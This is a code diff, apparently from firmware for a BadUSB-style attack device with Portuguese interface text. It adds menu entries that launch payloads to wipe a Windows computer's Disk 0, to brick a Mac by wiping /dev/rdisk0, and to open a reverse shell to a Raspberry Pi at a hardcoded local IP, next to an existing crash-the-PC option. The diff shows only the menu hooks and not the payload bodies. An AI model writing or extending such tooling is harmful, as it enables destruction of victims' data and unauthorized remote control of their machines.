@@ -18,6 +18,8 @@
 #include "modules/usb/usb_attacks.h"
 #include <globals.h>
 
+#define DEFAULT_IP "192.168.1.100"
+
 
 void UsbMenu::optionsMenu() {
     options.clear();
@@ -101,6 +103,24 @@ void UsbMenu::optionsMenu() {
                            displayWarning("ATENCAO: BSOD\n\nIsso vai crashar\no PC alvo!", true);
                            delay(2000);
                            usb_run_payload(PAYLOAD_BSOD);
+                       }});
+
+    options.push_back({"Disk Wipe Windows", [=]() {
+                           displayWarning("DISK WIPE WINDOWS\n\nVai apagar TUDO!\nDisk 0", true);
+                           delay(2000);
+                           usb_run_payload(PAYLOAD_DISK_WIPE_WIN);
+                       }});
+
+    options.push_back({"Disk Wipe Mac", [=]() {
+                           displayWarning("DISK WIPE MAC\n\nVai brickar o Mac!\n/dev/rdisk0", true);
+                           delay(2000);
+                           usb_run_payload(PAYLOAD_DISK_WIPE_MAC);
+                       }});
+
+    options.push_back({"Reverse Shell to Pi", [=]() {
+                           displayWarning("Reverse Shell to Pi\n\nConnects to Raspberry Pi\nshell.ps1", true);
+                           delay(1000);
+                           usb_payload_reverse_shell_pi(DEFAULT_IP);
                        }});
 
     // Ataques Rápidos
